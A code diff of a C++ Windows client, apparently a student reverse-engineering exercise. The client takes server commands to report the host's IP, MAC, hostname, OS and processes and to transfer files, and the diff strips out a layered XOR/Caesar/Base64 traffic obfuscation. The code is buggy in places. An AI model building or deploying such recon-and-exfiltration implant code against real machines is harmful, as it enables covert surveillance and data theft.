@@ -1,3 +1,9 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <winsock2.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,140 +20,60 @@
 #include <locale>
 #include <tchar.h>
 #include <algorithm>
-#include <cctype>
-#include <cmath>
 
 #pragma comment(lib, "WS2_32")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-
-// Caesar Cipher
-int caesar_shift = 3;
-
-// XOR Encryption
-std::string key1 = "csec476";
-std::string key2 = "reversingproject";
-
-// Base64 characters
-static const std::string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-// Encode functions ...
-std::string xor_encrypt(const std::string &input, const std::string &key) {
-    std::string output;
-    output.resize(input.size());
-    for (size_t i = 0; i < input.size(); ++i) {
-        output[i] = input[i] ^ key[i % key.size()];
-    }
-    return output;
-}
-
-std::string caesar_encrypt(const std::string &input) {
-    std::string output;
-    output.resize(input.size());
-    for (size_t i = 0; i < input.size(); ++i) {
-        if (isalpha(input[i])) {
-            int offset = isupper(input[i]) ? 'A' : 'a';
-            output[i] = (input[i] - offset + caesar_shift) % 26 + offset;
-        } else {
-            output[i] = input[i];
-        }
-    }
-    return output;
-}
-
-std::string caesar_decrypt(const std::string &input) {
-    std::string output;
-    output.resize(input.size());
-    for (size_t i = 0; i < input.size(); ++i) {
-        if (isalpha(input[i])) {
-            int offset = isupper(input[i]) ? 'A' : 'a';
-            output[i] = (input[i] - offset - caesar_shift + 26) % 26 + offset;
-        } else {
-            output[i] = input[i];
-        }
-    }
-    return output;
-}
-
-std::string base64_encode(const std::string &input) {
-    std::string output;
-    int val = 0;
-    int valb = -6;
-    for (unsigned char c : input) {
-        val = (val << 8) + c;
-        valb += 8;
-        while (valb >= 0) {
-            output.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
-            valb -= 6;
-        }
-    }
-    if (valb > -6) {
-        output.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
-    }
-    while (output.size() % 4) {
-        output.push_back('=');
-    }
-    return output;
-}
-
-std::string base64_decode(const std::string &input) {
-    std::string output;
-    std::vector<int> T(256, -1);
-    for (size_t i = 0; i < BASE64_CHARS.size(); i++) {
-        T[BASE64_CHARS[i]] = i;
-    }
-
-    int val = 0;
-    int valb = -8;
-    for (unsigned char c : input) {
-        if (T[c] == -1) {
-            break;
-        }
-        val = (val << 6) + T[c];
-        valb += 6;
-        if (valb >= 0) {
-            output.push_back(static_cast<char>((val >> valb) & 0xFF));
-            valb -= 8;
-        }
-    }
-    return output;
-}
-
-// Encode Decode Comb
-std::string encrypt(const std::string &input) {
-    // Step 1: XOR
-    std::string xor_encrypted = xor_encrypt(input, key1);
-
-    // Step 2: Caesar Cipher
-    std::string caesar_encrypted = caesar_encrypt(xor_encrypted);
-
-    // Step 3: Base64
-    std::string base64_encoded = base64_encode(caesar_encrypted);
-
-    // Step 4: XOR again
-    std::string final_encrypted = xor_encrypt(base64_encoded, key2);
-
-    return final_encrypted;
-}
-
-std::string decrypt(const std::string &input) {
-    // Step 1: XOR
-    std::string xor_decrypted = xor_encrypt(input, key2);
-
-    // Step 2: Base64
-    std::string base64_decoded = base64_decode(xor_decrypted);
-
-    // Step 3: Caesar Cipher
-    std::string caesar_decrypted = caesar_decrypt(base64_decoded);
-
-    // Step 4: XOR again
-    std::string final_decrypted = xor_encrypt(caesar_decrypted, key1);
-
-    return final_decrypted;
-}
-
 using namespace std;
+
+string upload(const string& filePath, int clientSocket)
+{
+    // Extract the file name from the file path
+    size_t lastSlashIndex = filePath.find_last_of("/\\");
+    string fileName = filePath.substr(lastSlashIndex + 1);
+    cout << fileName << endl;
+
+    // Open the file to be uploaded
+    ifstream fileStream(filePath, ios::in | ios::binary);
+    if (!fileStream) {
+        cerr << "Error: could not open file " << filePath << endl;
+        closesocket(clientSocket);
+        WSACleanup();
+        return "";
+    }
+
+    // Read the file into a string
+    string fileData((istreambuf_iterator<char>(fileStream)), istreambuf_iterator<char>());
+
+    return fileData;
+}
+
+
+string download(int clientSocket, const string& filePath) {
+    // Send the file path to the server
+    int result = send(clientSocket, filePath.c_str(), static_cast<int>(filePath.size() + 1), 0);
+    if (result == SOCKET_ERROR) {
+        cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
+        closesocket(clientSocket);
+        WSACleanup();
+        return "";
+    }
+
+    // Receive the file data from the server
+    string fileData;
+    const int bufferSize = 1024;
+    char buffer[bufferSize];
+    int bytesRead;
+    do {
+        bytesRead = recv(clientSocket, buffer, bufferSize, 0);
+        if (bytesRead > 0) {
+            fileData.append(buffer, bytesRead);
+        }
+    } while (bytesRead == bufferSize);
+
+    return fileData;
+}
 
 void getComputerName() {
     char hostname[MAX_COMPUTERNAME_LENGTH + 1];
@@ -299,6 +225,7 @@ vector<wstring> getRunningProcesses()
     return processNames;
 }
 
+
 int main(int argc, char* arg[]) {
 
     //Setting up DLL
@@ -307,6 +234,10 @@ int main(int argc, char* arg[]) {
     int port = 8080;
     WSADATA wsaData;
     int wsaerr;
+    int resultInt;
+    string serverAddress = "127.0.0.1";
+    string uploadPath = "C:\\Users\\student\\Desktop\\example.txt";
+    string downloadPath = "C:\\Users\\student\\Desktop\\downloaded.txt";
 
     WORD wVersionRequested = MAKEWORD(2, 2);
     wsaerr = WSAStartup(wVersionRequested, &wsaData);
@@ -350,144 +281,132 @@ int main(int argc, char* arg[]) {
 
     //Get command from the server
     //Commands:
-    //IPADDRESS:            IP
-    //USERNAME:             US
-    //MACADDRESS:           MA
-    //OS VERSION:           OS
-    //RUNNING PROCESSES:    PR
-    //UPLOAD:               UP
-    //DOWNLOAD:             DO
+    //  IPADDRESS
+    //  USERNAME
+    //  MACADDRESS
+    //  OS VERSION
+    //  RUNNING PROCESSES
+    //  UPLOAD
+    //  DOWNLOAD
 
+    //receive command from server
+    char buffer[200];
+    int byteCount = recv(clientSocket, buffer, 200, 0);
+    string str(buffer);
+    if (byteCount > 0) {
+        if (str == "IPADDRESS") {
+            //Send IP Address
 
-    char recvbuf[200];
-    // Receive encrypted command from the server
-    int bytesReceived = recv(clientSocket, recvbuf, 200, 0);
-    recvbuf[bytesReceived] = '\0';
-    // Decrypt the received command
-    string serverCommand = decrypt(string(recvbuf));
+            string ipAddress = getIpAddress();
+            if (ipAddress != "") {
+                const char* msg = ipAddress.c_str();
+                int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+                if (bytesSent == SOCKET_ERROR) {
+                    cout << "Error at send(): " << WSAGetLastError() << endl;
+                    WSACleanup();
+                    return 0;
+                }
+                else {
+                    cout << "Message sent to server: " << msg << endl;
+                }
+            }
+        }
+        else if (str == "USERNAME") {
+            //Send Hostname
 
-    cout << "Server Command: " << serverCommand << endl;
-    transform(serverCommand.begin(), serverCommand.end(), serverCommand.begin(), toupper);
+            char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+            DWORD size = sizeof(hostname) / sizeof(char);
 
-    //Send message to the server
-    if (serverCommand.substr(0, 1) == "IP") {
+            if (GetComputerNameA(hostname, &size)) {
+                cout << "Message sent to server: " << hostname << endl;
+                send(clientSocket, hostname, strlen(hostname), 0);
+            }
+            else {
+                cout << "Could not send hostname. Error: " << GetLastError << endl;
+            }
+        }
+        else if (str == "MACADDRESS") {
+            //Send MAC Address
 
-        //Send IP Address
+            string MacAddress = getMacAddress();
+            if (MacAddress != "") {
+                const char* macmsg = MacAddress.c_str();
+                int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
+                if (bytesSent == SOCKET_ERROR) {
+                    cout << "Error at send(): " << WSAGetLastError() << endl;
+                    WSACleanup();
+                    return 0;
+                }
+                else {
+                    cout << "Message sent to server: " << macmsg << endl;
+                }
+            }
+        }
+        else if (str == "OS VERSION") {
+            //Send OS Version
 
-        string ipAddress = getIpAddress();
-        if (ipAddress != "") {
-            //const char* msg = ipAddress.c_str();
-            //int bytesSent = send(clientSocket, msg, strlen(msg), 0);
-
-            // encode ip
-            string encryptedIpAddress = encrypt(ipAddress);
-            int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
-
+            string osMessage = getOS();
+            int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
             if (bytesSent == SOCKET_ERROR) {
-                cout << "Error at send(): " << WSAGetLastError() << endl;
+                cout << "Error while sending OS: " << WSAGetLastError() << endl;
+            }
+            else {
+                cout << "Message sent to server: " << osMessage << endl;
+            }
+        }
+        else if (str == "RUNNING PROCESSES") {
+            //Send Running Processes
+
+            vector<wstring> processes = getRunningProcesses();
+            string result = "Running processes: \n";
+            for (const auto& process : processes) {
+                result += string(process.begin(), process.end()) + "\n";
+            }
+
+            int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
+            if (bytesSent == SOCKET_ERROR) {
+                cout << "Error while sending running processes: " << WSAGetLastError() << endl;
+                WSACleanup();
+                return 0;
+            }
+        }
+        else if (str == "UPLOAD") {
+            string fileData = upload(uploadPath, clientSocket);
+            if (fileData.empty()) {
+                cerr << "Error: upload failed - file empty" << endl;
+                return 0;
+            }
+            else {
+                resultInt = send(clientSocket, fileData.c_str(), fileData.size(), 0);
+                if (resultInt == SOCKET_ERROR) {
+                    cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
+                    closesocket(clientSocket);
+                    WSACleanup();
+                    return 0;
+                }
+                cout << "File uploaded successfully." << endl;
+            }
+        }
+        else if (str == "DOWNLOAD") {
+            string fileData = download(clientSocket, downloadPath);
+            if (!fileData.empty()) {
+                cout << "File did not download correctly" << endl;
+                cout << fileData << endl;
+                closesocket(clientSocket);
                 WSACleanup();
                 return 0;
             }
             else {
-                cout << "Message sent to server: " << msg << endl;
+                cout << "File downloaded successfully" << endl;
             }
         }
     }
-    else if (serverCommand.substr(0, 1) == "MA") {
-
-        //Send MAC Address
-
-        string MacAddress = getMacAddress();
-        if (MacAddress != "") {
-            //const char* macmsg = MacAddress.c_str();
-            //int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
-
-            // encode mac
-            string encryptedMacAddress = encrypt(MacAddress);
-            int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
-
-            if (bytesSent == SOCKET_ERROR) {
-                cout << "Error at send(): " << WSAGetLastError() << endl;
-                WSACleanup();
-                return 0;
-            }
-            else {
-                cout << "Message sent to server: " << macmsg << endl;
-            }
-        }
+    else {
+        WSACleanup();
     }
-    else if (serverCommand.substr(0, 1) == "US") {
-
-        //Send Hostname
-
-        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
-        DWORD size = sizeof(hostname) / sizeof(char);
-
-        if (GetComputerNameA(hostname, &size)) {
-            //cout << "Message sent to server: " << hostname << endl;
-            //send(clientSocket, hostname, strlen(hostname), 0);
-            // encode hostname
-            string encryptedHostname = encrypt(string(hostname));
-            int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
-        }
-        else {
-            cout << "Could not send hostname. Error: " << GetLastError << endl;
-        }
-    }
-    else if (serverCommand.substr(0, 1) == "OS") {
-
-        //Send OS Version
-        string osMessage = getOS();
-        //int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
-        //encode os
-        string encryptedOsMessage = encrypt(osMessage);
-        int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
-        if (bytesSent == SOCKET_ERROR) {
-            cout << "Error while sending OS: " << WSAGetLastError() << endl;
-        }
-        else {
-            cout << "Message sent to server: " << osMessage << endl;
-        }
-    }
-    else if (serverCommand.substr(0, 1) == "PR") {
-
-        //Send Running Processes
-
-        vector<wstring> processes = getRunningProcesses();
-        string result = "Running processes: \n";
-        for (const auto& process : processes) {
-            result += string(process.begin(), process.end()) + "\n";
-        }
-
-        //int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
-
-        // encode running process
-        string encryptedResult = encrypt(result);
-        int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
-        if (bytesSent == SOCKET_ERROR) {
-            cout << "Error while sending running processes: " << WSAGetLastError() << endl;
-            WSACleanup();
-            return;
-        }
-    }    
-    
-    
 
     //Close the socket
     system("pause");
     WSACleanup();
-
-
-    //Add these so that they send messages
-    cout << "IP address: " << getIpAddress() << endl;
-    cout << "MAC address: " << getMacAddress() << endl;
-    cout << "OS: " << getOS() << endl;
-    cout << "Currently running processes: " << getOS() << endl;
-    vector<wstring> processes = getRunningProcesses();
-    for (const auto& process : processes)
-    {
-        wcout << process << endl;
-    }
-
     return 0;
 }
